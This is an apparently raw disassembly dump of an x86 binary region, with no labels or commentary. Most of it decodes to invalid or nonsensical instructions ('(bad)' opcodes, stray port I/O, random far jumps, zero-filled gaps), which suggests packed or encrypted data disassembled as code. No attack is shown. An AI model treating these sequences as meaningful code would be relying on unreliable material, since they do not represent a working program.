  40e7fd:	popf   
  40e7fe:	mov    eax,ds:0x48e452bd
  40e803:	inc    ecx
  40e804:	cli    
  40e805:	mov    edx,0xc9cdf818
  40e80a:	sti    
  40e80b:	out    0x2a,eax
  40e80d:	inc    edi
  40e80e:	xchg   ebx,eax
  40e80f:	(bad)  
  40e810:	mov    ebp,0x33e78bc9
  40e815:	hlt    
  40e816:	xchg   edx,eax
  40e817:	(bad)  
  40e818:	scas   al,BYTE PTR es:[edi]
  40e819:	scas   eax,DWORD PTR es:[edi]
  40e81a:	ret    0xa5b8
  40e81d:	imul   edx,DWORD PTR [edx+0xfe],0x0
	...
  40e830:	add    BYTE PTR [eax],al
  40e832:	test   al,0x44
  40e834:	int3   
  40e835:	push   es
  40e836:	sysexit 
  40e838:	sbb    al,0x0
  40e83a:	cli    
  40e83b:	jb     0x40e88e
  40e83d:	addr16 xor al,0xe1
  40e840:	inc    esp
  40e841:	add    BYTE PTR [edx],dl
  40e843:	cmp    ecx,DWORD PTR [ecx+0x41]
  40e846:	cli    
  40e847:	sbb    bl,BYTE PTR [ecx]
  40e849:	or     BYTE PTR [edx-0x4c],ah
  40e84c:	or     eax,0x2b865ff
  40e851:	push   0x4358c5
  40e856:	loop   0x40e877
  40e858:	dec    ecx
  40e859:	inc    ecx
  40e85a:	cli    
  40e85b:	inc    edx
  40e85c:	fnstcw WORD PTR [esi]
  40e85e:	adc    ebx,DWORD PTR [ebp+0x2]
  40e861:	call   0xfed25d0d
  40e866:	and    DWORD PTR [ecx-0x62],0x69
  40e86a:	cli    
  40e86b:	add    al,0x91
  40e86d:	daa    
  40e86e:	mov    edi,0x781be945
  40e873:	inc    edx
  40e874:	test   al,0x3
  40e876:	adc    eax,0xbadccdd2
  40e87b:	add    al,0x11
  40e87d:	iret   
  40e87e:	mov    ds:0xb67cfd8b,al
  40e883:	nop
  40e884:	add    BYTE PTR [ebx],0x62
  40e887:	adc    eax,0x1cfa44a4
  40e88c:	imul   ecx,DWORD PTR [eax+0x3b],0x5
  40e890:	(bad)  
  40e892:	sbb    al,0xde
  40e894:	daa    
  40e895:	add    al,0x0
	...
  40e8a7:	add    dl,ah
  40e8a9:	in     eax,0x2f
  40e8ab:	xchg   ebx,eax
  40e8ac:	int3   
  40e8ad:	jge    0x40e8da
  40e8af:	xchg   esp,eax
  40e8b0:	jbe    0x40e8f3
  40e8b2:	lds    esi,FWORD PTR [ebx]
  40e8b4:	push   edx
  40e8b5:	push   cs
  40e8b6:	sub    al,0x45
  40e8b8:	cli    
  40e8b9:	sbb    al,0x6b
  40e8bb:	dec    eax
  40e8bc:	cmp    eax,DWORD PTR ds:0xdde4d8a6
  40e8c2:	daa    
  40e8c3:	add    al,0x92
  40e8c5:	add    DWORD PTR [eax],esi
  40e8c7:	xchg   ebx,eax
  40e8c8:	xchg   esp,eax
  40e8c9:	jge    0x40e8ee
  40e8cb:	pushf  
  40e8cc:	js     0x40e8d7
  40e8ce:	jge    0x40e8d3
  40e8d0:	push   cs
  40e8d1:	cmp    eax,0x48a106a
  40e8d6:	std    
  40e8d7:	inc    ebp
  40e8d8:	jns    0x40e8e3
  40e8da:	jge    0x40e8df
  40e8dc:	out    0xc8,al
  40e8de:	rol    BYTE PTR [edx+edi*8],1
  40e8e1:	fwait
  40e8e2:	sahf   
  40e8e3:	xchg   edx,eax
  40e8e4:	out    0xfc,al
  40e8e6:	inc    eax
  40e8e7:	aaa    
  40e8e8:	test   al,0x8b
  40e8ea:	dec    ebp
  40e8eb:	xchg   edx,eax
  40e8ec:	(bad)  
  40e8ed:	nop
  40e8ee:	inc    ebp
  40e8ef:	sbb    dl,dh
  40e8f1:	pushf  
  40e8f2:	xchg   ecx,eax
  40e8f3:	xor    eax,0x35ff8b3d
  40e8f8:	adc    dl,BYTE PTR [ebp-0x5cce4b02]
  40e8fe:	lahf   
  40e8ff:	mov    ebx,0x94fe8a88
  40e904:	jge    0x40e890
  40e906:	je     0x40e8e9
  40e908:	jno    0x40e97a
  40e90a:	push   ecx
  40e90b:	push   cs
	...
  40e91c:	add    BYTE PTR [eax],al
  40e91e:	push   0x680d748a
  40e923:	adc    al,ch
  40e925:	(bad)  
  40e926:	in     eax,0xfc
  40e928:	out    0x92,eax
  40e92a:	das    
  40e92b:	mov    bh,dh
  40e92d:	out    dx,al
  40e92e:	add    eax,0x2d7de799
  40e933:	mov    bh,dh
  40e935:	fiadd  WORD PTR ds:0xd65e791
  40e93b:	mov    bh,dh
  40e93d:	into   
  40e93e:	in     eax,0x94
  40e940:	out    0x6d,eax
  40e942:	or     eax,0xe5befe8a
  40e947:	pushf  
  40e948:	out    0x35,eax
  40e94a:	in     eax,dx
  40e94b:	mov    esi,edi
  40e94d:	scas   al,BYTE PTR es:[edi]
  40e94e:	add    eax,0xa61cfe89
  40e953:	mov    ds:0x8b8b3bee,al
  40e958:	pop    esi
  40e959:	mov    al,ds:0x340006bc
  40e95e:	setle  BYTE PTR [edx+0x1c6aad]
  40e965:	adc    esi,DWORD PTR [esi]
  40e967:	mov    dh,BYTE PTR [ecx+eiz*8-0x6f]
  40e96b:	je     0x40e9be
  40e96d:	outs   dx,BYTE PTR ds:[esi]
  40e96e:	mov    edi,DWORD PTR [ebp+0x44]
  40e971:	gs add al,0x5
  40e974:	push   0xffffffe9
  40e976:	add    DWORD PTR [ebx+0x44],edx
  40e979:	test   al,0xf9
  40e97b:	sbb    al,0x0
  40e97d:	jmp    0x1286e7b
	...
  40e992:	add    BYTE PTR [eax],al
  40e994:	lahf   
  40e995:	fdivp  st(6),st
  40e997:	dec    DWORD PTR [eax-0x3a]
  40e99a:	jb     0x40e9bf
  40e99c:	xchg   ebx,eax
  40e99d:	outs   dx,BYTE PTR ds:[esi]
  40e99e:	add    DWORD PTR [edi-0x24],ebx
  40e9a1:	jae    0x40e9ac
  40e9a3:	rol    BYTE PTR [edi+0x13684e9f],0x6
  40e9aa:	out    dx,eax
  40e9ab:	mov    esi,0x4144377b
  40e9b0:	and    edx,esi
  40e9b2:	(bad)  
  40e9b3:	jne    0x40e9c0
  40e9b5:	outs   dx,BYTE PTR ds:[esi]
  40e9b6:	out    dx,eax
  40e9b7:	jns    0x40e9b5
  40e9b9:	je     0x40e9a1
  40e9bb:	sbb    eax,0xfffd7496
  40e9c0:	data16 jp 0x40e9c0
  40e9c3:	jne    0x40e9b0
  40e9c5:	ins    DWORD PTR es:[edi],dx
  40e9c6:	mov    ss,WORD PTR [edx-0x44]
  40e9c9:	je     0x40e992
  40e9cb:	ret    0x5e7
  40e9ce:	push   ebp
  40e9cf:	mov    ecx,DWORD PTR [edi-0x1b033d80]
  40e9d5:	jmp    0x873:0x741269ff
  40e9dc:	mov    ebx,0x5cff50b0
  40e9e1:	push   cs
  40e9e2:	inc    esp
  40e9e3:	cld    
  40e9e4:	sub    BYTE PTR [ebx+0xd22856],bh
  40e9ea:	cmp    BYTE PTR [edi],0xa3
  40e9ed:	icebp  
  40e9ee:	aas    
  40e9ef:	push   0x414247
  40e9f4:	in     al,0x68
  40e9f6:	jl     0x40ea1f
	...
  40ea08:	add    BYTE PTR [eax],al
  40ea0a:	xchg   ebx,eax
  40ea0b:	add    eax,0xa077c00b
  40ea10:	push   ebp
  40ea11:	call   0x3fbdd8
  40ea16:	push   0xa31972c5
  40ea1b:	in     eax,dx
  40ea1c:	(bad)  
  40ea1d:	(bad)  
  40ea1e:	cli    
  40ea1f:	inc    edx
  40ea20:	push   ecx
  40ea21:	xor    BYTE PTR [bx+si+0x41],ah
  40ea25:	add    BYTE PTR [edx+0x52081642],ch
  40ea2b:	sbb    cl,BYTE PTR [edx]
  40ea2d:	push   DWORD PTR ds:0x2d534c43
  40ea33:	fimul  DWORD PTR [esi-0x6fdbc5ce]
  40ea39:	(bad)  
  40ea3a:	sbb    eax,0xd2ad94ea
  40ea3f:	call   0xfe8e:0x700dc015
  40ea46:	(bad)  
  40ea47:	xchg   ebx,eax
  40ea48:	call   0xc35e:0x8e8aa81f
  40ea4f:	fadd   QWORD PTR [esi]
  40ea51:	add    BYTE PTR [edi+0x23],al
  40ea54:	lahf   
  40ea55:	cmp    BYTE PTR [esi-0x595c95e],0x33
  40ea5c:	inc    edx
  40ea5d:	dec    DWORD PTR [edi-0x5a]
  40ea60:	call   0x3f88:0x8eb72bc1
  40ea67:	ret    0x3c7a
  40ea6a:	and    dh,dh
  40ea6c:	inc    esp
	...
  40ea7d:	add    BYTE PTR [eax],al
  40ea7f:	add    BYTE PTR [edx-0x71],bh
  40ea82:	add    dh,BYTE PTR [edx+edi*1+0x46]
  40ea86:	call   0xefe8:0x359e3b44
  40ea8d:	mov    esi,0x5e010002
  40ea92:	pop    ss
  40ea93:	and    esp,DWORD PTR ds:0x855dd386
  40ea99:	jg     0x40ea95
  40ea9b:	mov    edi,0x6832a506
  40eaa0:	cli    
  40eaa1:	popf   
  40eaa2:	popf   
  40eaa3:	mov    ebp,0x41490ce2
  40eaa8:	cli    
  40eaa9:	add    al,0xb9
  40eaab:	mov    fs,esi
  40eaad:	cld    
  40eaae:	push   eax
  40eaaf:	out    dx,al
  40eab0:	rol    BYTE PTR [edi+0x30c39c55],cl
  40eab6:	dec    esi
  40eab7:	pop    DWORD PTR [ecx-0x2c]
  40eaba:	sub    BYTE PTR [ebp+0x3c],cl
  40eabd:	mov    BYTE PTR ds:0xf0572b8f,bh
  40eac3:	push   es
  40eac4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eac5:	(bad)
  40eac9:	add    eax,0x28fc1c8e
  40eacf:	sbb    dh,bl
  40ead1:	sbb    al,0x12
  40ead3:	dec    ecx
  40ead4:	mov    ebx,0xe29bb904
  40ead9:	sub    al,0x6
  40eadb:	(bad)  
  40eadc:	lods   eax,DWORD PTR ds:[esi]
  40eadd:	sbb    al,0xe9
  40eadf:	add    esp,ebp
  40eae1:	inc    esi
  40eae2:	adc    BYTE PTR [eax+eax*1+0x0],0x0
	...
  40eaf6:	ss inc esi
  40eaf8:	jmp    0xf152d030
  40eafd:	fimul  DWORD PTR [esi+ebx*8]
  40eb01:	mov    ds,ebp
  40eb03:	stc    
  40eb04:	cmp    al,0x8f
  40eb06:	int3   
  40eb07:	sbb    cl,BYTE PTR [edx]
  40eb09:	pushf  
  40eb0a:	cs sub eax,0xc4f08ec6
  40eb10:	xor    al,0xe8
  40eb12:	sbb    eax,0xfa452f04
  40eb17:	xor    al,0xc1
  40eb19:	cdq    
  40eb1a:	dec    esp
  40eb1b:	mov    BYTE PTR [ebp-0x16faedcd],ah
  40eb21:	sahf   
  40eb22:	push   edi
  40eb23:	sbb    al,0x98
  40eb25:	dec    eax
  40eb26:	cmp    eax,DWORD PTR ds:0xfd0e8f39
  40eb2c:	nop
  40eb2d:	push   ecx
  40eb2e:	add    eax,0x579b7d88
  40eb33:	xor    eax,DWORD PTR [eax]
  40eb35:	jbe    0x40ebb3
  40eb37:	xchg   BYTE PTR [ebp+ebp*2+0x74],dh
  40eb3b:	adc    BYTE PTR [eax],cl
  40eb3d:	push   ecx
  40eb3e:	es call FWORD PTR ss:[esi+0x24]
  40eb43:	mov    esi,0x31f9edc1
  40eb48:	mov    edi,DWORD PTR ds:0x74efc378
  40eb4e:	mov    dl,0x94
  40eb50:	dec    edi
  40eb51:	ds adc bh,cl
  40eb54:	out    0x9e,eax
  40eb56:	fiadd  WORD PTR [edi+0xe2fe]
	...
  40eb6c:	cmp    DWORD PTR [ebx],edx
  40eb6e:	xor    ch,BYTE PTR [edx+0xa]
  40eb71:	mov    DWORD PTR [ecx],eax
  40eb73:	xchg   edi,eax
  40eb74:	sbb    BYTE PTR [edx+0x44],bh
  40eb77:	adc    edi,edx
  40eb79:	test   DWORD PTR [edi],esi
  40eb7b:	mov    ebp,0x619101b
  40eb80:	loop   0x40eb76
  40eb82:	(bad)  
  40eb83:	je     0x40eb76
  40eb85:	sahf   
  40eb86:	and    eax,0xfe877c99
  40eb8b:	je     0x40ec02
  40eb8d:	xchg   DWORD PTR [ecx+eiz*8+0x6f],esi
  40eb91:	adc    DWORD PTR [eax],ecx
  40eb93:	rcl    DWORD PTR [esi*1+0x414dd6ff],1
  40eb9a:	lock cmp DWORD PTR [esi+0x51],esp
  40eb9e:	pop    eax
  40eb9f:	(bad)  
  40eba0:	outs   dx,DWORD PTR ds:[esi]
  40eba1:	mov    ebp,0x2ff9edc1
  40eba6:	mov    eax,ebp
  40eba8:	jnp    0x40eb6c
  40ebaa:	test   DWORD PTR [ebx-0x2],0x5a6431a
  40ebb1:	std    
  40ebb2:	out    0x51,eax
  40ebb4:	into   
  40ebb5:	test   esi,edi
  40ebb7:	pusha  
  40ebb8:	xor    eax,0xe3e96989
  40ebbd:	add    al,0x68
  40ebbf:	add    BYTE PTR [edx+0xb004140],ah
  40ebc5:	add    eax,DWORD PTR [eax]
  40ebc7:	add    bl,ah
  40ebc9:	push   0x77d45670
  40ebce:	or     eax,eax
	...
  40ebe0:	add    BYTE PTR [eax],al
  40ebe2:	aas    
  40ebe3:	mov    ecx,0xe8db4587
  40ebe8:	pop    esp
  40ebe9:	inc    esi
  40ebea:	mov    ds:0xab75ff02,al
  40ebef:	push   0x25325e0
  40ebf4:	or     eax,eax
  40ebf6:	outs   dx,DWORD PTR ds:[esi]
  40ebf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebf8:	std    
  40ebf9:	jne    0x40ebe6
  40ebfb:	push   0x77d45d01
  40ec00:	dec    esi
  40ec01:	push   0x3ebcf1
  40ec06:	imul   eax,DWORD PTR [edx],0x0
  40ec09:	out    dx,eax
  40ec0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec0b:	jmp    0xe807:0xedf44fff
  40ec12:	dec    ebx
  40ec13:	lock (bad) 
  40ec15:	dec    DWORD PTR [ebx]
  40ec17:	cwde   
  40ec18:	push   ecx
  40ec19:	jmp    esp
  40ec1b:	js     0x40ec90
  40ec1d:	clc    
  40ec1e:	sti    
  40ec1f:	(bad)  
  40ec20:	push   ecx
  40ec21:	call   esp
  40ec23:	js     0x40ec98
  40ec25:	cld    
  40ec26:	mov    ah,0xee
  40ec28:	pop    es
  40ec29:	call   0x3fbe87
  40ec2e:	call   0xeb0b:0xde0002c3
  40ec35:	sbb    DWORD PTR [edi+0x75],0x68
  40ec39:	add    BYTE PTR [ecx],bh
  40ec3b:	cmp    eax,0x699b75ff
  40ec40:	sub    al,0x50
  40ec42:	push   esp
  40ec43:	js     0x40ebcc
  40ec45:	inc    ebp
	...
  40ec56:	add    BYTE PTR [eax],al
  40ec58:	ja     0x40ec43
  40ec5a:	(bad)  
  40ec5b:	(bad)  
  40ec5c:	cli    
  40ec5d:	jle    0x40ecab
  40ec5f:	addr16 or bl,dh
  40ec62:	inc    edx
  40ec63:	add    BYTE PTR [edx],dl
  40ec65:	stc    
  40ec66:	inc    ebp
  40ec67:	inc    ecx
  40ec68:	cli    
  40ec69:	push   es
  40ec6a:	push   ss
  40ec6b:	or     BYTE PTR [edx+0x5],ah
  40ec6e:	adc    al,0xff
  40ec70:	gs push ss
  40ec72:	push   ss
  40ec73:	cld    
  40ec74:	pop    ebp
  40ec75:	test   al,0xfa
  40ec77:	out    0xc5,eax
  40ec79:	dec    ebx
  40ec7a:	mov    edi,esi
  40ec7c:	inc    ebx
  40ec7d:	fld    DWORD PTR [esi]
  40ec7f:	add    BYTE PTR [edi+0x36829f22],ch
  40ec85:	inc    ebx
  40ec86:	sbb    eax,DWORD PTR [eax]
  40ec88:	cli    
  40ec89:	ss dec ebp
  40ec8b:	(bad)  
  40ec8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec8d:	mov    ds:0xd6b5429a,eax
  40ec92:	mov    edi,esi
  40ec94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec95:	(bad)  
  40ec96:	mov    esi,DWORD PTR [edx+eax*1-0xc]
  40ec9a:	push   0x8bee0d4e
  40ec9f:	je     0x40ec8b
  40eca1:	not    BYTE PTR ds:0x3c0e1208
  40eca7:	push   ebp
  40eca9:	adc    DWORD PTR [eax+ebx*1],0xffffffed
  40ecad:	add    edi,esi
  40ecaf:	(bad)  
  40ecb0:	outs   dx,DWORD PTR ds:[esi]
  40ecb1:	call   0x8a6b:0x2d54
  40ecb7:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40ecb9:	sub    al,0x45
	...
  40eccb:	add    BYTE PTR [eax],al
  40eccd:	add    ch,cl
  40eccf:	loope  0x40ecc4
  40ecd1:	out    0x1f,eax
  40ecd3:	or     DWORD PTR [eax+eax*1],eax
  40ecd6:	icebp  
  40ecd7:	lods   eax,DWORD PTR ds:[esi]
  40ecd8:	adc    BYTE PTR [ebp+0x22],ah
  40ecdb:	std    
  40ecdc:	inc    ecx
  40ecdd:	inc    ecx
  40ecde:	cli    
  40ecdf:	inc    ebp
  40ece0:	or     ah,BYTE PTR [ebx]
  40ece2:	cli    
  40ece3:	ins    DWORD PTR es:[edi],dx
  40ece4:	jnp    0x40ed2a
  40ece6:	mov    ds:0x3f551105,al
  40eceb:	(bad)  
  40ecec:	call   0x8155f37b
  40ecf1:	add    ebx,edi
  40ecf3:	add    al,0xe9
  40ecf5:	(bad)  
  40ecf6:	cmp    eax,0xbf06eef9
  40ecfb:	jl     0x40ed6c
  40ecfd:	inc    ecx
  40ecfe:	or     al,BYTE PTR [ebx+edi*8+0x1a25df3]
  40ed05:	mov    ebx,DWORD PTR [eax+ecx*4+0x60]
  40ed09:	mov    ecx,ecx
  40ed0b:	cmp    BYTE PTR [eax+0x41],dh
  40ed0e:	dec    esi
  40ed0f:	in     eax,dx
  40ed10:	out    0x3,eax
  40ed12:	push   ebp
  40ed13:	ret    
  40ed14:	dec    ebp
  40ed15:	adc    edx,esi
  40ed17:	ins    BYTE PTR es:[edi],dx
  40ed18:	xor    edi,DWORD PTR [edx]
  40ed1a:	xor    eax,0xfe113d84
  40ed1f:	cmp    DWORD PTR [ebx-0x61d6e205],0xffffff8a
  40ed26:	sbb    al,0x84
  40ed28:	fwait
  40ed29:	xchg   DWORD PTR [edx+edi*8],edx
  40ed2c:	lock fwait
  40ed2e:	inc    esp
  40ed2f:	rcl    DWORD PTR ds:0x8b,cl
	...
  40ed41:	add    BYTE PTR [eax],al
  40ed43:	add    BYTE PTR [edx+edi*8],al
  40ed46:	lock mov al,BYTE PTR [esi+0x2110618]
  40ed4d:	ins    DWORD PTR es:[edi],dx
  40ed4e:	sbb    eax,0x1f83ed3a
  40ed53:	(bad)  
  40ed54:	or     DWORD PTR ds:0x87d17e94,eax
  40ed5a:	lods   al,BYTE PTR ds:[esi]
  40ed5b:	mov    ebp,DWORD PTR [edi]
  40ed5d:	mov    BYTE PTR [ebx],bl
  40ed5f:	push   ebp
  40ed60:	pop    ds
  40ed61:	(bad)  
  40ed62:	call   0x6a423b6a
  40ed67:	enter  0x328e,0x28
  40ed6b:	add    al,0xfa
  40ed6d:	clc    
  40ed6e:	cmp    DWORD PTR [edi+0x25ee],eax
  40ed74:	aas    
  40ed75:	add    eax,0x4bfc3500
  40ed7a:	inc    esp
  40ed7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed7c:	stc    
  40ed7d:	add    al,0x0
  40ed7f:	jmp    0xea38b63c
  40ed84:	stc    
  40ed85:	add    al,0x0
  40ed87:	pop    esp
  40ed88:	cmp    al,BYTE PTR [ecx+0x7cba744f]
  40ed8e:	dec    edi
  40ed8f:	adc    esi,esi
  40ed91:	in     al,dx
  40ed92:	jns    0x40edc3
  40ed94:	mov    edi,0xc2d4ff04
  40ed99:	xor    DWORD PTR [ecx-0x17],eax
  40ed9c:	push   esp
  40ed9d:	ret    
  40ed9e:	jae    0x40ed4a
  40eda0:	je     0x40eda2
  40eda2:	clc    
  40eda3:	jmp    0xccc42f9d
	...
  40edb8:	add    BYTE PTR [eax],al
  40edba:	jne    0x40ed3f
  40edbc:	jb     0x40edbc
  40edbe:	mov    ah,0xf8
  40edc0:	sti    
  40edc1:	push   edx
  40edc2:	and    ebx,ecx
  40edc4:	mov    bh,bh
  40edc6:	jo     0x40edc1
  40edc8:	pop    ss
  40edc9:	or     esp,DWORD PTR cs:[ecx]
  40edcc:	call   FWORD PTR [edi-0x268a7def]
  40edd2:	cmp    al,0x7
  40edd5:	add    DWORD PTR [ebx-0x7f],edx
  40edd8:	dec    BYTE PTR [esi]
  40edda:	rol    DWORD PTR [ebx+0x487c014c],cl
  40ede0:	add    ebp,DWORD PTR [edx+0x2]
  40ede3:	jge    0x40ede4
  40ede5:	jl     0x40ede1
  40ede7:	test   DWORD PTR ds:0xfe5a0ae9,edi
  40eded:	pop    esp
  40edee:	add    BYTE PTR [ebx-0x3a4f67ec],0xff
  40edf5:	add    DWORD PTR ss:[ebx+eax*1-0x17],0xeb8e0c
  40edfe:	and    BYTE PTR [ebp-0xe],al
  40ee01:	push   ebx
  40ee02:	push   esp
  40ee03:	inc    edx
  40ee04:	clc    
  40ee05:	add    BYTE PTR [ebx-0x2938fffa],dl
  40ee0b:	xchg   esp,eax
  40ee0c:	(bad)  
  40ee0d:	jmp    DWORD PTR [ebx-0x6c8a00fa]
  40ee13:	std    
  40ee14:	inc    ebx
  40ee15:	cld    
  40ee16:	inc    edx
  40ee17:	sbb    bh,ah
  40ee19:	push   0xffffff93
  40ee1b:	and    BYTE PTR [eax],al
  40ee1d:	push   0x0
	...
  40ee2f:	add    BYTE PTR [ebx+0x20],ah
  40ee32:	add    bh,bh
  40ee34:	data16 mov bh,ch
  40ee37:	jne    0x40ee98
  40ee39:	and    BYTE PTR [eax],al
  40ee3b:	push   0x53
  40ee3d:	sahf   
  40ee3e:	retf   0x6322
  40ee41:	push   es
  40ee42:	or     eax,eax
  40ee44:	daa    
  40ee45:	push   ebx
  40ee46:	dec    esi
  40ee47:	push   eax
  40ee48:	mov    ebx,0xacff512a
  40ee4d:	std    
  40ee4e:	inc    ebx
  40ee4f:	clc    
  40ee50:	pop    edx
  40ee51:	and    BYTE PTR [eax],al
  40ee53:	push   0x23
  40ee55:	aaa    
  40ee56:	push   DWORD PTR [ebp-0x15]
  40ee59:	mov    esi,DWORD PTR [ebx-0x4]
  40ee5c:	int3   
  40ee5d:	adc    DWORD PTR [edx+ebp*2],ecx
  40ee60:	and    esp,DWORD PTR [eax]
  40ee62:	add    al,ch
  40ee64:	mov    ch,0x6a
  40ee66:	(bad)  
  40ee67:	call   FWORD PTR [eax]
  40ee69:	inc    esi
  40ee6a:	jae    0x40ee7b
  40ee6c:	in     al,dx
  40ee6d:	adc    eax,edi
  40ee6f:	call   0x40253b
  40ee74:	adc    al,0x42
  40ee76:	clc    
  40ee77:	add    bl,dl
  40ee79:	add    eax,0x8e4e8300
  40ee7e:	(bad)  
  40ee7f:	jae    0x40ee8e
  40ee81:	mov    WORD PTR [ebx+0x8],?
  40ee84:	lods   al,BYTE PTR ds:[esi]
  40ee85:	adc    bh,al
  40ee87:	call   0x247286
  40ee8c:	mov    ebp,0xf573c266
  40ee91:	sbb    ecx,DWORD PTR [ecx+0x74]
	...
  40eea3:	add    BYTE PTR [eax],al
  40eea5:	add    BYTE PTR [edx],al
  40eea7:	push   esp
  40eea8:	add    esp,DWORD PTR [edx]
  40eeaa:	cli    
  40eeab:	imul   ebp,DWORD PTR [ecx],0x3
  40eeae:	mov    ebx,0xe0eaaae6
  40eeb3:	jmp    0x40ee7f
  40eeb5:	or     al,0x7
  40eeb7:	dec    eax
  40eeb8:	sar    bh,0x85
  40eebb:	ds pushf 
  40eebd:	in     eax,dx
  40eebe:	fld    TBYTE PTR [ebx+0x2]
  40eec1:	or     edi,DWORD PTR [edx]
  40eec3:	jg     0x40eeb2
  40eec5:	dec    edi
  40eec6:	retf   0x9093
  40eec9:	dec    edi
  40eeca:	gs cli 
  40eecc:	jns    0x40ef12
  40eece:	data16 adc al,0x33
  40eed1:	dec    edi
  40eed3:	fbstp  TBYTE PTR [ebx]
  40eed5:	call   0xfec8abc7
  40eeda:	push   ecx
  40eedb:	jno    0x40ef1f
  40eedd:	add    BYTE PTR [edx],0x6c
  40eee0:	or     eax,0x8ac035d1
  40eee5:	out    0x3b,eax
  40eee7:	fwait
  40eee8:	xchg   esi,edi
  40eeea:	jno    0x40ee9c
  40eeec:	mov    ds,WORD PTR [edx+0x33]
  40eeef:	sub    eax,0xf6aefff7
  40eef4:	xchg   esi,eax
  40eef5:	xor    BYTE PTR [esi],0x37
  40eef8:	xor    DWORD PTR [edi+0x79],edx
  40eefb:	pop    eax
  40eefc:	loope  0x40ef26
  40eefe:	mov    ebx,0xfc75026b
  40ef03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef04:	sub    cl,cl
  40ef06:	mov    eax,0x8d0272
	...
  40ef1b:	add    BYTE PTR [edi],bh
  40ef1d:	jle    0x40ef50
  40ef1f:	jmp    DWORD PTR [edi+0x62]
  40ef22:	call   0x87:0xe6052c30
  40ef29:	inc    ebp
  40ef2a:	in     eax,dx
  40ef2b:	jg     0x40ef43
  40ef2d:	push   es
  40ef2e:	jmp    0xcd436a36
  40ef33:	add    al,0xfa
  40ef35:	adc    al,0xe9
  40ef37:	idiv   BYTE PTR [eax+0x18]
  40ef3a:	call   0x3bc0e942
  40ef3f:	mov    BYTE PTR [edx+edi*8-0x21ae6350],bl
  40ef46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef47:	xchg   DWORD PTR [eax],eax
  40ef49:	inc    ebp
  40ef4a:	in     eax,dx
  40ef4b:	cmp    cl,0x5
  40ef4e:	jmp    0x8d3b6c56
  40ef53:	xchg   esi,ebp
  40ef55:	jl     0x40ef67
  40ef57:	jae    0x40ef10
  40ef59:	(bad)
  40ef5c:	dec    eax
  40ef5d:	jg     0x40efd4
  40ef5f:	xchg   DWORD PTR [edx-0x36],esi
  40ef62:	jl     0x40eeeb
  40ef64:	into   
  40ef65:	and    BYTE PTR [ebp+0x11],0x52
  40ef69:	in     eax,dx
  40ef6a:	fs ds mov ebx,0x3fc44104
  40ef71:	or     BYTE PTR [ebp+0x7d],0xbe
  40ef75:	ins    BYTE PTR es:[edi],dx
  40ef76:	inc    ebp
  40ef77:	adc    DWORD PTR [esi],ebp
  40ef79:	xor    BYTE PTR [ebx-0x51606275],0x44
	...
  40ef90:	add    BYTE PTR [eax],al
  40ef92:	cli    
  40ef93:	ins    BYTE PTR es:[edi],dx
  40ef94:	jnp    0x40ef1c
  40ef96:	adc    al,0x80
  40ef98:	outs   dx,DWORD PTR ds:[esi]
  40ef99:	inc    ecx
  40ef9a:	push   ss
  40ef9b:	test   BYTE PTR [ebx+0x6d0f0597],bl
  40efa1:	pop    ebp
  40efa2:	std    
  40efa3:	jg     0x40ef8d
  40efa5:	xor    BYTE PTR [esi+0x6d],0xe8
  40efa9:	idiv   BYTE PTR [ecx-0x61]
  40efac:	call   0xffc4e9b4
  40efb1:	jae    0x40f030
  40efb3:	jg     0x40efc2
  40efb5:	gs dec ebx
  40efb7:	cmp    dh,0xe9
  40efba:	je     0x40efb4
  40efbc:	out    0xd1,eax
  40efbe:	enter  0x24,0xe9
  40efc2:	inc    eax
  40efc3:	stc    
  40efc4:	out    0x62,eax
  40efc6:	jg     0x40ef52
  40efc8:	(bad)  
  40efc9:	cwde   
  40efca:	mov    ss,esp
  40efcc:	jmp    0xbf9:0x3bb2040f
  40efd3:	or     eax,0x904f03c
  40efd8:	sub    al,0xd9
  40efda:	jo     0x40efdf
  40efdc:	sub    al,0x28
  40efde:	cli    
  40efdf:	or     al,BYTE PTR [eax+0x9f5a995]
  40efe5:	imul   edi,DWORD PTR [ebp+0x3c],0x6b79ec77
  40efec:	das    
  40efed:	xchg   edx,eax
  40efee:	addr16 (bad) 
  40eff0:	jmp    0x40f01a
  40eff2:	jbe    0x40f037
  40eff4:	or     DWORD PTR [ecx+0x0],ebp
	...
  40f006:	add    BYTE PTR [eax],al
  40f008:	cdq    
  40f009:	add    ecx,DWORD PTR [edx]
  40f00b:	sub    eax,0x300accb3
  40f010:	jmp    0xfe61:0x260584e
  40f017:	aam    0x91
  40f019:	mov    es,WORD PTR [ecx+ecx*2+0x6c]
  40f01d:	enter  0xe9d7,0xf9
  40f021:	add    al,0x0
  40f023:	fs mov edx,0xfec34f58
  40f029:	jmp    0x92ff:0xeaf992ff
  40f030:	stc    
  40f031:	xchg   ecx,eax
  40f032:	inc    esp
  40f033:	xor    eax,0xc8147fc9
  40f038:	(bad)  
  40f039:	(bad)  
  40f03c:	call   0x50636283
  40f041:	or     eax,0x665f00d8
  40f046:	std    
  40f047:	jne    0x40f038
  40f049:	xchg   BYTE PTR [ebx-0x28],dh
  40f04c:	aam    0xe
  40f04e:	in     al,0xff
  40f050:	cs popf 
  40f052:	std    
  40f053:	jne    0x40f030
  40f055:	call   0x75fd:0x88c4fcbb
  40f05c:	pop    ebx
  40f05d:	mov    eax,ds:0x2932096
  40f062:	push   DWORD PTR [ebp-0x49]
  40f065:	mov    eax,ds:0x88644f78
  40f06a:	std    
  40f06b:	jne    0x40f06d
	...
  40f07d:	add    BYTE PTR [ebx-0x5f],ch
  40f080:	jo     0x40f0d1
  40f082:	fs mov ch,bh
  40f085:	jne    0x40f0f6
  40f087:	mov    eax,ds:0x88844f68
  40f08c:	mov    eax,DWORD PTR [ebp-0xd]
  40f08f:	cmp    al,ch
  40f091:	nop
  40f092:	push   cs
  40f093:	mov    ch,bh
  40f095:	pop    edi
  40f096:	add    eax,0x630cc0ba
  40f09b:	das    
  40f09c:	mov    ebp,esp
  40f09e:	loopne 0x40f0e4
  40f0a0:	cli    
  40f0a1:	push   0x53
  40f0a3:	sbb    al,0x45
